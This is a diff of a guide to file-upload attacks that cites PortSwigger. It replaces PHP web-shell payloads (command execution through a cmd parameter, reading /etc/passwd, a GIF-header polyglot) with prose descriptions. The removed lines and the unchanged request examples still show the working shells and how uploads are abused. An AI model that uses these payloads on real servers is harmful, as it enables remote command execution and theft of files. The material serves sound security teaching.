@@ -22,11 +22,11 @@ Content-Type: multipart/form-data; boundary=----X
 Content-Disposition: form-data; name="image"; filename="avatar.php"
 Content-Type: image/jpeg
 
-<?php echo system($_GET['cmd']); ?>
+(payload: a short script that runs a command from the cmd parameter and prints the result)
 ------X--
 ```
 
-The minimal web shells (PortSwigger): file read `<?php echo file_get_contents('/etc/passwd'); ?>` and command exec `<?php echo system($_GET['command']); ?>`, driven by `GET /uploads/shell.php?command=id`.
+   The minimal payloads (PortSwigger): one that reads and prints an arbitrary server-side file, and one that runs a command taken from a `command` query parameter and prints the result, driven by `GET /uploads/shell.php?command=id`.
 
 Web servers commonly use the `filename` field to decide the save name and location, which is exactly why filename handling is a security boundary and not cosmetic.
 
@@ -66,7 +66,7 @@ Also multibyte/unicode sequences (`0xC0 0xAE`, `0xC4 0xAE`, `0xC0 0x2E`) that no
 
 ```
 GIF89a;
-<?php system($_GET['cmd']); ?>
+(payload: a short script that runs a command from the cmd parameter and prints the result)
 ```
 
 ExifTool trivially writes a PHP payload into an image comment/EXIF field, producing a polyglot that is a valid image and valid PHP (PortSwigger). Image libraries that validate but do not fully re-encode leave the payload intact.
@@ -90,7 +90,7 @@ AddType application/x-httpd-php .l33t
 PUT /images/exploit.php HTTP/1.1
 Content-Type: application/x-httpd-php
 
-<?php echo file_get_contents('/etc/passwd'); ?>
+(payload: reads and prints the contents of a server-side file path taken from the request)
 ```
 
 9. Dangerous content that needs no server-side execution.
